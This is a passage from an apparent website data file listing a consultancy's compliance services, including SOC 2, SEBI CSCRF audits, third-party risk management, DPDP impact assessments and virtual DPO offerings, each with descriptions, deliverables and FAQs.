        "description": "Complete architectural breakdown of software, people, procedures, data, and infrastructure in scope."
      }
    ],
    "engagementModels": [
      {
        "name": "Full SOC 2 Type I & Type II Turnkey Bundle",
        "suitableFor": "SaaS companies achieving their first SOC 2 attestation for enterprise sales",
        "description": "Complete readiness assessment, system description authoring, Type I audit, and Type II observation management."
      },
      {
        "name": "SOC 2 Type II Annual Maintenance Retainer",
        "suitableFor": "Companies renewing their annual Type II report",
        "description": "Continuous quarterly evidence verification, policy refresh, and external CPA audit management."
      },
      {
        "name": "SOC 1 (SSAE 18) Financial Services Audit",
        "suitableFor": "Fintechs, payment gateways, and platforms impacting client financial statements",
        "description": "Auditing internal controls over financial transactions and IT general controls."
      }
    ],
    "faqs": [
      {
        "question": "What is the difference between SOC 2 Type I and SOC 2 Type II?",
        "answer": "A Type I report evaluates the suitability of control design at a single point in time. A Type II report evaluates whether those controls actually operated effectively over a minimum 6 to 12 month observation window."
      },
      {
        "question": "Can Envista sign our official SOC 2 report?",
        "answer": "SOC reports must be issued by an independent, licensed Certified Public Accountant (CPA) firm. Envista prepares your systems, engineers controls, authors the System Description, and partners with accredited CPA firms who conduct the formal examination and issue the final report."
      },
      {
        "question": "Which Trust Services Criteria should our company include?",
        "answer": "Security (Common Criteria) is mandatory for all SOC 2 reports. Most B2B SaaS companies also add Availability and Confidentiality. If you process financial transactions, Processing Integrity is added; if you handle consumer personal data, Privacy is added."
      }
    ]
  },
  {
    "category": "grc",
    "categoryTitle": "GRC Solutions",
    "id": "sebi-cscrf",
    "slug": "sebi-cscrf-consulting",
    "title": "SEBI CSCRF Consulting & Capital Markets Compliance",
    "navTitle": "SEBI CSCRF Consulting",
    "badge": "Indian Capital Markets",
    "tagline": "Navigate the Cybersecurity and Cyber Resilience Framework for SEBI Regulated Entities.",
    "heroSummary": "Specialized advisory and audit services aligned with the Securities and Exchange Board of India (SEBI) Cybersecurity and Cyber Resilience Framework (CSCRF). We support Stock Brokers, Depository Participants, Mutual Funds, Qualified RTAs, and Alternative Investment Funds (AIFs).",
    "promise": "100% SEBI CSCRF Compliance & Audit Attestation",
    "metrics": [
      {
        "value": "CSCRF",
        "label": "Full Framework Coverage",
        "sub": "Governance to Recovery"
      },
      {
        "value": "CERT-In",
        "label": "Empanelled Audits",
        "sub": "Mandated technical VAPT"
      },
      {
        "value": "Quarterly",
        "label": "Regulatory Filings",
        "sub": "SEBI portal submissions"
      },
      {
        "value": "0",
        "label": "Regulatory Penalties",
        "sub": "Proven compliance record"
      }
    ],
    "frameworks": [
      "SEBI CSCRF Guidelines",
      "CERT-In Directives",
      "RBI Master Directions",
      "ISO 27001:2022"
    ],
    "whyItMatters": {
      "title": "SEBI Enforces Strict Penalties for Cybersecurity Deficiencies",
      "description": "Under the new CSCRF mandates, Regulated Entities (REs) face severe regulatory scrutiny, trading suspension, and financial penalties for failing to implement mandatory API security, SOC monitoring, and disaster recovery switchovers.",
      "points": [
        {
          "headline": "Mandatory VAPT & Technical Audits",
          "detail": "Conduct mandatory half-yearly and annual VAPT through CERT-In empanelled auditors with zero high-severity findings."
        },
        {
          "headline": "Mandated 24/7 SOC Telemetry & Alert Retention",
          "detail": "Implement compliant Security Operations Center logging with mandatory log retention periods across all trading gateways."
        },
        {
          "headline": "Statutory Regulatory Reporting & Form Filings",
          "detail": "Meet strict reporting timelines for quarterly compliance dashboards, root cause analysis (RCA), and incident disclosures."
        }
      ]
    },
    "vectors": [
      {
        "category": "Trading Infrastructure & API Gateway Security",
        "description": "Auditing order execution engines, algorithmic trading APIs, and core broker backends.",
        "capabilities": [
          "Algorithmic trading API security and rate-limiting audits",
          "Two-Factor Authentication (2FA) implementation verification",
          "Data-in-transit encryption across trading interfaces",
          "DDoS mitigation and trading continuity testing"
        ]
      },
      {
        "category": "Network Isolation & Zero Trust Architecture",
        "description": "Inspecting demilitarized zones (DMZs), trading VLANs, and administrative network boundaries.",
        "capabilities": [
          "Segmentation of trading systems from general corporate IT",
          "Privileged Access Management (PAM) enforcement on server farms",
          "Network access control (NAC) on employee trading floor terminals",
          "USB and external peripheral lockdown enforcement"
        ]
      },
      {
        "category": "Log Retention, SIEM & SOC Governance",
        "description": "Ensuring telemetry is stored securely and monitored around the clock.",
        "capabilities": [
          "WORM-compliant log archiving for mandatory regulatory periods",
          "NTP clock synchronization across all market transaction servers",
          "SIEM correlation rule alignment with SEBI threat scenarios",
          "SOC incident response escalation and reporting workflows"
        ]
      },
      {
        "category": "Business Continuity & DR Live Switchover",
        "description": "Validating Disaster Recovery sites and mandatory live trading switchovers.",
        "capabilities": [
          "Secondary DR site latency and replication consistency audits",
          "Live trading failover drill observation and documentation",
          "RTO / RPO compliance verification against SEBI ceilings",
          "Backup immutability and air-gap integrity testing"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Entity Categorization & Scoping",
        "title": "CSCRF Tiering Analysis",
        "description": "Classifying your organization (Qualified RE, Mid-Sized RE, Small RE) to establish specific applicable CSCRF controls.",
        "activities": [
          "Entity categorization assessment",
          "Control applicability matrix creation",
          "Executive scoping sign-off"
        ]
      },
      {
        "step": "02",
        "phase": "Baseline Gap Assessment",
        "title": "Policy & Technical Audit",
        "description": "Auditing current trading infrastructure, SOC operations, and policies against all CSCRF domains.",
        "activities": [
          "Technical architecture review",
          "Policy documentation review",
          "Gap severity prioritization"
        ]
      },
      {
        "step": "03",
        "phase": "Technical VAPT Execution",
        "title": "CERT-In Empanelled VAPT",
        "description": "Conducting mandatory vulnerability assessments and penetration testing across trading portals, APIs, and networks.",
        "activities": [
          "Web/API penetration testing",
          "Network infrastructure VAPT",
          "Exploitation re-testing"
        ]
      },
      {
        "step": "04",
        "phase": "Remediation & Evidence Compilation",
        "title": "Audit Dossier Preparation",
        "description": "Working with your internal engineering team to close all critical/high gaps and compile evidentiary artifacts.",
        "activities": [
          "Patch verification re-scan",
          "Compliance evidence packaging",
          "Quarterly dashboard preparation"
        ]
      },
      {
        "step": "05",
        "phase": "Final Attestation & Regulatory Filing",
        "title": "SEBI Portal Submission",
        "description": "Issuing formal third-party audit reports and assisting compliance officers with official SEBI portal filings.",
        "activities": [
          "Final audit report delivery",
          "Compliance score attestation",
          "Filing support"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "SEBI CSCRF Comprehensive Audit Report",
        "format": "Formal Regulatory PDF Dossier",
        "audience": "SEBI, Board of Directors, Managing Director",
        "description": "Exhaustive evaluation of compliance across all CSCRF chapters (Governance, Protection, Detection, Response, Recovery)."
      },
      {
        "title": "CERT-In Empanelled VAPT Certificate",
        "format": "Official Signed Attestation",
        "audience": "Stock Exchanges (NSE, BSE), Depositories (CDSL, NSDL), SEBI",
        "description": "Formal certificate validating that half-yearly or annual technical penetration testing was successfully executed."
      },
      {
        "title": "Quarterly Compliance Dashboard Matrix",
        "format": "Regulatory Form Format (Excel / PDF)",
        "audience": "Chief Compliance Officer, Head of Risk",
        "description": "Pre-formatted quarterly compliance report ready for direct submission onto the SEBI regulatory filing portal."
      }
    ],
    "engagementModels": [
      {
        "name": "Annual Retainer for SEBI CSCRF Governance",
        "suitableFor": "Stockbrokers, Mutual Funds, and Depository Participants",
        "description": "Comprehensive coverage: two VAPT cycles per year, quarterly compliance filings, and audit representation."
      },
      {
        "name": "Mandatory Half-Yearly VAPT Audit",
        "suitableFor": "Entities requiring standalone technical VAPT certification for NSE/BSE",
        "description": "Rigorous technical testing of trading applications, mobile apps, APIs, and network infrastructure."
      },
      {
        "name": "Pre-Audit CSCRF Gap Assessment",
        "suitableFor": "Firms preparing for an upcoming regulatory inspection from SEBI or Exchanges",
        "description": "Rapid 2-week mock audit identifying vulnerabilities and non-conformities before regulatory inspections."
      }
    ],
    "faqs": [
      {
        "question": "Which entities are required to comply with the SEBI CSCRF framework?",
        "answer": "SEBI CSCRF applies to Stock Brokers, Depository Participants, Asset Management Companies (Mutual Funds), Alternative Investment Funds (AIFs), Qualified Registrar and Transfer Agents (QRTAs), Clearing Corporations, and Stock Exchanges."
      },
      {
        "question": "How often must VAPT be conducted under SEBI rules?",
        "answer": "Depending on your entity classification, technical VAPT must be conducted either half-yearly or annually by a CERT-In empanelled auditing firm, with all critical and high findings remediated within strict timeframes."
      },
      {
        "question": "Does Envista assist with submitting reports to the NSE, BSE, and SEBI portals?",
        "answer": "Yes. We prepare pre-formatted regulatory dashboards and assist your Chief Compliance Officer with submitting required documentation through the relevant exchange and regulator portals."
      }
    ]
  },
  {
    "category": "grc",
    "categoryTitle": "GRC Solutions",
    "id": "tprm",
    "slug": "tpra-and-tprm-services",
    "title": "Third-Party Risk Assessment (TPRA & TPRM)",
    "navTitle": "TPRA & TPRM Services",
    "badge": "Supply Chain Assurance",
    "tagline": "Prevent Supply Chain Breaches by Continuously Auditing Your Third-Party Vendors and SaaS Providers.",
    "heroSummary": "Comprehensive Third-Party Risk Assessment (TPRA) and Third-Party Risk Management (TPRM) programs. We evaluate vendor security postures, audit external software developers, review Data Processing Agreements (DPAs), and continuously monitor vendor risk.",
    "promise": "De-Risk Your Enterprise Supply Chain & Vendor Ecosystem",
    "metrics": [
      {
        "value": "62%",
        "label": "Breaches Via Vendors",
        "sub": "Supply chain risk reality"
      },
      {
        "value": "Tiered",
        "label": "Vendor Risk Scoring",
        "sub": "Criticality-weighted models"
      },
      {
        "value": "DPA",
        "label": "Contractual Security Review",
        "sub": "Legal & compliance alignment"
      },
      {
        "value": "Continuous",
        "label": "Third-Party Monitoring",
        "sub": "Automated breach alerts"
      }
    ],
    "frameworks": [
      "NIST SP 800-161 (Supply Chain Risk)",
      "ISO 27001 Annex A.15",
      "Shared Assessments (SIG)",
      "SEBI Vendor Security Guidelines"
    ],
    "whyItMatters": {
      "title": "Your Security Is Only as Strong as Your Weakest Vendor",
      "description": "More than 60% of modern corporate data breaches originate through a third-party vendor, outsourced software developer, or SaaS provider that had access to internal networks or sensitive customer data.",
      "points": [
        {
          "headline": "Prevent Downstream Data Exfiltration",
          "detail": "Verify whether third-party contractors and SaaS applications enforce encryption, MFA, and robust access controls."
        },
        {
          "headline": "Standardize Vendor Security Questionnaires",
          "detail": "Replace slow, manual email questionnaires with automated SIG-aligned risk scoring platforms."
        },
        {
          "headline": "Ensure Regulatory Compliance for Outsourcing",
          "detail": "Satisfy explicit regulatory guidelines from RBI, SEBI, and GDPR prohibiting the unmonitored outsourcing of sensitive data."
        }
      ]
    },
    "vectors": [
      {
        "category": "Vendor Criticality Tiering & Inventory",
        "description": "Classifying vendors based on data access, network connectivity, and business operational impact.",
        "capabilities": [
          "Tier-1, Tier-2, and Tier-3 risk classification criteria",
          "Vendor data access mapping (PII, financial, source code)",
          "Direct network connectivity / VPN access identification",
          "Concentration risk and alternative supplier redundancy analysis"
        ]
      },
      {
        "category": "Technical Security & VAPT Audit of Vendors",
        "description": "Conducting independent security evaluations on outsourced vendors and software developers.",
        "capabilities": [
          "Reviewing vendor SOC 2 and ISO 27001 audit reports",
          "Remote technical security audits of vendor development environments",
          "Independent external attack surface scanning of vendor domains",
          "Verifying employee background check and offboarding controls"
        ]
      },
      {
        "category": "Contractual Security & DPA Governance",
        "description": "Ensuring vendor contracts contain enforceable cybersecurity clauses and liability terms.",
        "capabilities": [
          "Data Processing Agreement (DPA) security review",
          "Mandatory breach notification windows (e.g. 24 hours)",
          "Right-to-audit and independent verification clauses",
          "Data return, deletion, and post-termination sanitization terms"
        ]
      },
      {
        "category": "Continuous Vendor Attack Surface Monitoring",
        "description": "Real-time threat monitoring tracking vendor dark web leaks and exposed assets.",
        "capabilities": [
          "Monitoring dark web breach forums for vendor credential leaks",
          "Tracking vendor domain typosquatting and phishing abuse",
          "Monitoring vendor SSL certificate expirations and open ports",
          "Alerting when a critical vendor experiences a confirmed ransomware incident"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Vendor Inventory & Tiering",
        "title": "Ecosystem Discovery",
        "description": "Cataloging all active software, cloud, and operational vendors and categorizing them into risk tiers.",
        "activities": [
          "Vendor inventory consolidation",
          "Risk scoring questionnaire design",
          "Criticality tier assignment"
        ]
      },
      {
        "step": "02",
        "phase": "Assessment & Evidence Review",
        "title": "Security Due Diligence",
        "description": "Issuing standardized questionnaires (SIG/CAIQ), collecting SOC 2 reports, and reviewing technical architecture.",
        "activities": [
          "Questionnaire dispatch and collection",
          "Third-party audit report review",
          "Evidence gap identification"
        ]
      },
      {
        "step": "03",
        "phase": "Risk Analysis & Remediations",
        "title": "Finding Evaluation",
        "description": "Identifying high-risk vendor practices and mandating corrective action plans prior to contract renewal.",
        "activities": [
          "Vendor risk score generation",
          "Corrective action plan negotiation",
          "Executive risk sign-off"
        ]
      },
      {
        "step": "04",
        "phase": "Contractual Alignment & DPA Review",
        "title": "Legal Governance",
        "description": "Ensuring vendor contracts include enforceable cybersecurity safeguards and liability obligations.",
        "activities": [
          "DPA security clause drafting",
          "Breach notification timeline enforcement",
          "Right-to-audit verification"
        ]
      },
      {
        "step": "05",
        "phase": "Continuous Vendor Surveillance",
        "title": "Ongoing Third-Party Radar",
        "description": "Continuously monitoring vendor attack surfaces and threat intelligence for signs of compromise.",
        "activities": [
          "Continuous dark web surveillance",
          "Automated re-assessment triggers",
          "Annual vendor score review"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Third-Party Vendor Risk Matrix",
        "format": "Interactive Portal + Excel Dashboard",
        "audience": "Head of Procurement, CISO, Risk Committee",
        "description": "Comprehensive inventory of all vendors with quantitative risk scores, compliance certifications, and residual risk ratings."
      },
      {
        "title": "Individual Vendor Assessment Dossier",
        "format": "Detailed Technical PDF",
        "audience": "Vendor Security Leads, Internal IT",
        "description": "Granular audit report for high-risk vendors detailing identified security deficiencies and mandatory remediation timelines."
      },
      {
        "title": "Vendor Cybersecurity Policy & DPA Template Pack",
        "format": "Standardized Legal Documents",
        "audience": "Procurement, Legal Counsel",
        "description": "Ready-to-use vendor security requirements, standard cybersecurity contract schedules, and DPA agreements."
      }
    ],
    "engagementModels": [
      {
        "name": "Managed Third-Party Risk Program (TPRM as a Service)",
        "suitableFor": "Enterprises with 50+ third-party vendors needing continuous assessment",
        "description": "End-to-end vendor onboarding, questionnaire evaluation, SOC 2 review, and continuous monitoring."
      },
      {
        "name": "Critical Vendor Deep-Dive Technical Audit",
        "suitableFor": "High-risk software developers, core cloud platforms, and payroll providers",
        "description": "Comprehensive on-site or remote technical audit of a specific critical supplier's infrastructure."
      },
      {
        "name": "Vendor Security Policy & Questionnaire Standardization",
        "suitableFor": "Organizations establishing their first formal third-party risk management framework",
        "description": "Designing custom vendor tiers, risk scoring algorithms, and automated assessment workflows."
      }
    ],
    "faqs": [
      {
        "question": "What do we do if an important vendor refuses to fill out our security questionnaire?",
        "answer": "We provide alternative validation methodologies: reviewing the vendor's existing SOC 2 Type II or ISO 27001 certificates, evaluating their public attack surface, and applying compensating contractual liability clauses."
      },
      {
        "question": "How often should third-party vendors be re-assessed?",
        "answer": "Critical Tier-1 vendors (those hosting sensitive customer data or with network connectivity) should be re-assessed annually or continuously. Lower-risk vendors can be assessed every 2 years."
      },
      {
        "question": "Can Envista conduct penetration testing directly against our vendors?",
        "answer": "Penetration testing requires explicit written authorization from the vendor. We coordinate with vendors to obtain testing permissions or review certified independent third-party VAPT reports."
      }
    ]
  }
];

const DPDP_SERVICES: SubServiceDetail[] = [
  {
    "category": "dpdp",
    "categoryTitle": "DPDP Consulting",
    "id": "dpia",
    "slug": "data-protection-impact-assessment",
    "title": "Data Protection Impact Assessment (DPIA)",
    "navTitle": "Data Protection Impact Assessment",
    "badge": "Statutory Privacy DPIA",
    "tagline": "Systematically Identify, Evaluate, and Mitigate Risks to Data Principals Under India's DPDP Act 2023.",
    "heroSummary": "Comprehensive Data Protection Impact Assessments (DPIAs) tailored for the Digital Personal Data Protection (DPDP) Act 2023. We map personal data flows, evaluate processing risks, audit automated decision-making, and implement statutory safeguards before high-risk data processing commences.",
    "promise": "100% Statutory DPIA Alignment with DPDP Rules",
    "metrics": [
      {
        "value": "DPDP 2023",
        "label": "Statutory Compliance",
        "sub": "MeitY rules aligned"
      },
      {
        "value": "0-Spill",
        "label": "Data Flow Lineage",
        "sub": "End-to-end PII mapping"
      },
      {
        "value": "360°",
        "label": "Third-Party Audited",
        "sub": "Processor pipeline checks"
      },
      {
        "value": "Actionable",
        "label": "Mitigation Playbooks",
        "sub": "Engineering-ready controls"
      }
    ],
    "frameworks": [
      "India DPDP Act 2023",
      "ISO/IEC 27701 (PIMS)",
      "GDPR Article 35",
      "NIST Privacy Framework"
    ],
    "whyItMatters": {
      "title": "Penalties Under the DPDP Act Reach Up to ₹250 Crores",
      "description": "Processing digital personal data without structured risk evaluation or failing to prevent data breaches carries penalties up to ₹250 Crores under the DPDP Act. A formal DPIA proves due diligence and regulatory compliance.",
      "points": [
        {
          "headline": "Mandatory for Significant Data Fiduciaries (SDFs)",
          "detail": "Entities processing high volumes of sensitive personal data or processing children's data are legally required to conduct periodic DPIAs."
        },
        {
          "headline": "Prevent Uncontrolled Data Sprawl",
          "detail": "Discover undocumented personal data stored in analytics warehouses, customer support chat logs, and backup dumps."
        },
        {
          "headline": "Statutory Defense Before the Data Protection Board",
          "detail": "A documented DPIA serves as vital legal proof of reasonable security safeguards in the event of an inquiry."
        }
      ]
    },
    "vectors": [
      {
        "category": "PII Data Lineage & Flow Mapping",
        "description": "Tracing digital personal data from initial collection to final deletion across all enterprise systems.",
        "capabilities": [
          "Data collection touchpoint discovery across web, mobile, and offline forms",
          "Mapping data sharing with third-party processors and cloud APIs",
          "Identifying cross-border data transfer routes and foreign hosting",
          "Validating retention period enforcement and automated deletion schedules"
        ]
      },
      {
        "category": "Lawfulness of Processing & Purpose Limitation",
        "description": "Auditing whether each data field is collected strictly for lawful, explicitly consented purposes.",
        "capabilities": [
          "Evaluating processing legitimacy against Section 4 of DPDP Act",
          "Assessing purpose creep and secondary data usage across AI models",
          "Reviewing data minimization principles across registration forms",
          "Evaluating reasonable security safeguards implemented on PII datastores"
        ]
      },
      {
        "category": "Children's & Sensitive Personal Data Safeguards",
        "description": "Specialized auditing for services accessible to minors or processing verifiable parental consent.",
        "capabilities": [
          "Verifiable parental consent mechanism verification",
          "Prohibition of behavioral tracking and targeted advertising for minors",
          "Biometric and health data processing risk evaluation",
          "Age verification workflow resilience audits"
        ]
      },
      {
        "category": "Data Principal Rights Impact Evaluation",
        "description": "Assessing how system architecture supports customer rights to access, correct, and erase data.",
        "capabilities": [
          "Automated erasure verification across relational and NoSQL databases",
          "Data portability and structured export readiness audits",
          "Consent withdrawal propagation to third-party processors",
          "Grievance redressal response latency benchmarking"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Project Ingestion & Scope",
        "title": "Processing Activity Profiling",
        "description": "Identifying high-risk processing initiatives, algorithmic profiling, or new digital product rollouts.",
        "activities": [
          "Stakeholder kickoff",
          "Processing activity inventory",
          "Architecture diagram collection"
        ]
      },
      {
        "step": "02",
        "phase": "Data Discovery & Lineage Audit",
        "title": "PII Mapping",
        "description": "Crawling databases, API payloads, and third-party SaaS tools to catalog all collected personal data fields.",
        "activities": [
          "Automated PII data discovery",
          "Data lineage flow diagramming",
          "Processor contract review"
        ]
      },
      {
        "step": "03",
        "phase": "Risk Evaluation & Harm Assessment",
        "title": "Threat & Privacy Risk Scoring",
        "description": "Assessing the likelihood and severity of potential harm to Data Principals in the event of breach or misuse.",
        "activities": [
          "Privacy risk matrix evaluation",
          "Regulatory liability calculation",
          "Control adequacy scoring"
        ]
      },
      {
        "step": "04",
        "phase": "Mitigation Strategy Engineering",
        "title": "Remediation Playbook Design",
        "description": "Designing technical countermeasures such as tokenization, differential privacy, and consent gate enforcement.",
        "activities": [
          "Encryption & tokenization guidance",
          "Consent interface redesign",
          "Retention script configuration"
        ]
      },
      {
        "step": "05",
        "phase": "Formal DPIA Dossier Delivery",
        "title": "Board & Regulatory Sign-Off",
        "description": "Issuing formal DPIA reports reviewed by privacy counsel, ready for submission to management and regulators.",
        "activities": [
          "DPIA report finalization",
          "Executive board presentation",
          "Annual re-assessment schedule"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Statutory DPIA Master Report",
        "format": "Comprehensive Formal PDF",
        "audience": "Data Protection Board, CISO, Legal Counsel",
        "description": "Exhaustive legal and technical evaluation detailing processing purpose, necessity, proportionality, and residual risks."
      },
      {
        "title": "Personal Data Inventory & Lineage Map",
        "format": "Interactive Data Flow Map (Visio / PDF / CSV)",
        "audience": "Data Architects, Software Engineers",
        "description": "Visual map documenting every database, table, API, and cloud processor touching customer personal data."
      },
      {
        "title": "Privacy Risk Treatment Action Plan",
        "format": "Prioritized Remediation Matrix",
        "audience": "Product Managers, DevOps Leads",
        "description": "Actionable engineering tickets detailing exact architectural modifications required to resolve privacy risks."
      }
    ],
    "engagementModels": [
      {
        "name": "Full Scope Product DPIA",
        "suitableFor": "Launching new digital banking apps, fintech platforms, or healthcare systems",
        "description": "Comprehensive pre-launch assessment covering all customer data touchpoints."
      },
      {
        "name": "Annual Significant Data Fiduciary (SDF) DPIA Retainer",
        "suitableFor": "Large enterprises classified as SDFs under Indian DPDP rules",
        "description": "Periodic continuous DPIA audits aligned with statutory annual compliance mandates."
      },
      {
        "name": "AI & Algorithmic Processing DPIA",
        "suitableFor": "Organizations training machine learning models or automated decision engines on consumer data",
        "description": "Targeted evaluation of training data consent, bias, and automated profiling risks."
      }
    ],
    "faqs": [
      {
        "question": "When is a DPIA legally mandatory under the DPDP Act 2023?",
        "answer": "The Central Government will notify Significant Data Fiduciaries (SDFs) based on factors like data volume, sensitivity, and risk of harm. SDFs are legally mandated to conduct periodic DPIAs, appoint an independent data auditor, and deploy a resident DPO."
      },
      {
        "question": "How long does a DPIA take for a complex enterprise system?",
        "answer": "A typical product or platform DPIA takes 2 to 4 weeks depending on the number of interconnected databases, third-party processors, and operational teams involved."
      },
      {
        "question": "Does a DPIA review our third-party cloud and analytics vendors?",
        "answer": "Yes! Under the DPDP Act, the Data Fiduciary remains accountable for data processed by third-party Data Processors. The DPIA audits vendor contracts, encryption in transit, and data residency."
      }
    ]
  },
  {
    "category": "dpdp",
    "categoryTitle": "DPDP Consulting",
    "id": "virtual-dpo",
    "slug": "virtual-dpo",
    "title": "Virtual Data Protection Officer (vDPO) Services",
    "navTitle": "Virtual DPO",
    "badge": "Statutory Privacy Counsel",
    "tagline": "Resident Indian Privacy Leadership, Regulatory Interface, and Statutory Governance.",
    "heroSummary": "Outsourced, accredited Data Protection Officer services fulfilling statutory mandates under India's DPDP Act 2023. Our certified privacy attorneys and cyber engineers serve as your primary liaison to the Data Protection Board of India, oversee grievance redressal, and direct privacy governance.",
    "promise": "Statutory Resident DPO Representation & Regulatory Interface",
    "metrics": [
      {
        "value": "Resident",
        "label": "Indian Statutory DPO",
        "sub": "Legal requirement fulfilled"
      },
      {
        "value": "< 24h",
        "label": "Grievance Response SLA",
        "sub": "Data Principal disputes"
      },
      {
        "value": "Board",
        "label": "DPDB Interface",
        "sub": "Official communications"
      },
      {
        "value": "72h",
        "label": "Breach Notification Support",
        "sub": "Statutory incident filing"
      }
    ],
    "frameworks": [
      "India DPDP Act 2023 (Section 10)",
      "GDPR Article 37-39",
      "ISO/IEC 27701",
      "MeitY Data Protection Rules"
    ],
    "whyItMatters": {
      "title": "Significant Data Fiduciaries Must Appoint a Resident Indian DPO",
      "description": "Under Section 10 of the DPDP Act, every Significant Data Fiduciary must appoint a Data Protection Officer based in India who reports directly to the Board of Directors and serves as the official point of contact for the Data Protection Board.",
      "points": [
        {
          "headline": "Satisfy Statutory Residency & Qualification Mandates",
          "detail": "Avoid executive headhunting delays by appointing seasoned, certified privacy counsel immediately."
        },
        {
          "headline": "Independent, Conflict-Free Privacy Governance",
          "detail": "The DPDP Act requires the DPO to act independently without conflicts of interest (e.g. CTOs or Marketing Heads cannot legally serve as DPO)."
        },
        {
          "headline": "Streamlined Grievance Redressal & Breach Handling",
          "detail": "Ensure consumer privacy complaints and statutory breach notifications are resolved within mandated legal timelines."
        }
      ]
    },
    "vectors": [
      {
        "category": "Regulatory Interface & Data Protection Board Liaison",
        "description": "Acting as the official, registered communication bridge to the Data Protection Board of India.",
        "capabilities": [
          "Handling formal regulatory inquiries, summons, and notices from the DPDB",
          "Managing mandatory data breach notifications to the Board and impacted Principals",
          "Representing the company during regulatory mediation and hearings",
          "Submitting periodic statutory privacy compliance audit reports"
        ]
      },
      {
        "category": "Data Principal Grievance Redressal Oversight",
        "description": "Directing the resolution of consumer privacy complaints and rights fulfillment.",
        "capabilities": [
          "Supervising the statutory Grievance Redressal Officer (GRO) workflow",
          "Reviewing escalated Data Principal requests for correction, erasure, or withdrawal",
          "Ensuring statutory response deadlines (typically 7 to 30 days) are met",
          "Preventing consumer escalation to the Data Protection Board"
        ]
      },
      {
        "category": "Internal Privacy Governance & Audit Direction",
        "description": "Maintaining ongoing privacy discipline across engineering, marketing, and HR.",
        "capabilities": [
          "Reviewing new product features for Privacy-by-Design compliance",
          "Conducting mandatory annual privacy audits and control assessments",
          "Advising the Board of Directors on privacy risk posture and legal developments",
          "Reviewing third-party Data Processing Agreements and vendor liabilities"
        ]
      },
      {
        "category": "Workforce Privacy Enablement & Culture",
        "description": "Educating employees on handling personal data under Indian statutory rules.",
        "capabilities": [
          "Conducting tailored DPDPA training for developers, product managers, and HR",
          "Establishing clear incident escalation and reporting procedures",
          "Publishing internal employee data privacy manuals",
          "Running periodic internal privacy awareness refreshers"
        ]
      }
    ],
    "lifecycle": [
      {
        "step": "01",
        "phase": "Onboarding & Registration",
        "title": "Statutory Appointment",
        "description": "Formal appointment of the vDPO via Board resolution and publishing contact details on corporate websites.",
        "activities": [
          "Board resolution execution",
          "Privacy policy contact update",
          "Grievance workflow baseline"
        ]
      },
      {
        "step": "02",
        "phase": "Baseline Privacy Health Check",
        "title": "Compliance Posture Audit",
        "description": "Reviewing existing consent notices, data retention practices, and third-party processor agreements.",
        "activities": [
          "Notice and consent mechanism audit",
          "DPA gap identification",
          "Remediation priority ranking"
        ]
      },
      {
        "step": "03",
        "phase": "Grievance Mechanism Setup",
        "title": "Workflow Operationalization",
        "description": "Setting up dedicated privacy grievance email queues, automated ticketing, and escalation SLA workflows.",
        "activities": [
          "Ticketing system integration",
          "Standard response template design",
          "Grievance officer coaching"
        ]
      },
      {
        "step": "04",
        "phase": "Ongoing Regulatory Governance",
        "title": "Active Retainer Leadership",
        "description": "Attending monthly risk meetings, approving new data processing initiatives, and reviewing vendor agreements.",
        "activities": [
          "Monthly compliance reviews",
          "Vendor DPA sign-offs",
          "New feature privacy reviews"
        ]
      },
      {
        "step": "05",
        "phase": "Annual Audit & Board Briefing",
        "title": "Yearly Statutory Reporting",
        "description": "Conducting the mandatory annual data protection audit and presenting formal governance reports to the Board.",
        "activities": [
          "Annual privacy audit execution",
          "Board presentation delivery",
          "Statutory record archiving"
        ]
      }
    ],
    "deliverables": [
      {
        "title": "Statutory DPO Appointment & Authority Pack",
        "format": "Official Legal Documentation",
        "audience": "Board of Directors, Data Protection Board of India",
        "description": "Formal documentation establishing DPO appointment, operational independence, and regulatory liaison powers."
      },
      {
        "title": "Monthly Privacy Governance & Grievance Report",
        "format": "Executive Management PDF",
        "audience": "CISO, General Counsel, Executive Leadership",
        "description": "Detailed monthly summary of all processed Data Principal requests, vendor audits, and regulatory communications."
      },
      {
        "title": "Annual Privacy Compliance Audit Dossier",
        "format": "Formal Regulatory Audit PDF",
        "audience": "Data Protection Board, External Auditors",
        "description": "Comprehensive statutory report verifying continuous adherence to the DPDP Act 2023 across all business operations."
      }
    ],
    "engagementModels": [
      {
        "name": "Full Statutory vDPO Retainer (Yearly)",
        "suitableFor": "Significant Data Fiduciaries and mid-to-large enterprises processing high volumes of personal data",
        "description": "Named resident DPO representation, DPDB liaison, monthly governance, and unlimited grievance oversight."
      },
      {
        "name": "Fractional DPO Advisory (Quarterly)",
        "suitableFor": "Growing startups and scale-ups needing expert privacy counsel without full-time requirements",
        "description": "Part-time advisory, policy approvals, vendor DPA reviews, and emergency breach escalation standby."
      },
      {
        "name": "Interim DPO Leadership",
        "suitableFor": "Enterprises in between full-time privacy hires or navigating active regulatory inquiries",
        "description": "Dedicated hands-on leadership managing privacy operations and regulatory interfaces."
      }
    ],
    "faqs": [
      {
        "question": "Is a Virtual DPO legally permitted under India's DPDP Act 2023?",
        "answer": "Yes. The DPDP Act requires the DPO to be an individual based in India who reports to the Board, represents the organization to the Board of Data Protection, and possesses relevant expertise. Outsourced / virtual DPO services are fully recognized and widely adopted."
      },
      {
        "question": "What happens if a Data Principal files a formal complaint with the Data Protection Board?",
        "answer": "Your assigned vDPO immediately takes charge of the matter, reviews the audit trail of the consumer's request, prepares the formal legal and technical defense response, and represents your company before the Board."
      },
      {
        "question": "Can our existing in-house Legal Counsel or Chief Technology Officer serve as the DPO?",
        "answer": "While legally allowed for non-SDFs, doing so creates severe conflicts of interest. For Significant Data Fiduciaries, global privacy standards and DPDP principles favor an independent DPO whose sole fiduciary duty is data protection compliance."
      }
    ]
  },
  {
    "category": "dpdp",
    "categoryTitle": "DPDP Consulting",
    "id": "consent-management",
    "slug": "consent-management-tool",
    "title": "Consent Management Architecture & Tooling",
    "navTitle": "Consent Management Tool",
    "badge": "Itemized & Multilingual Consent",
    "tagline": "Deploy Itemized, Affirmative, and Multilingual Consent Architecture Mandated by DPDP Act 2023.",
    "heroSummary": "Technical architecture and turnkey software implementation for dynamic consent capture, immutable recording, and real-time withdrawal. We configure multilingual consent notices in all 22 Eighth Schedule languages, synchronized across web, mobile apps, and backend databases.",
    "promise": "Statutory Consent Architecture Aligned with Section 6 of DPDP Act",
    "metrics": [
      {
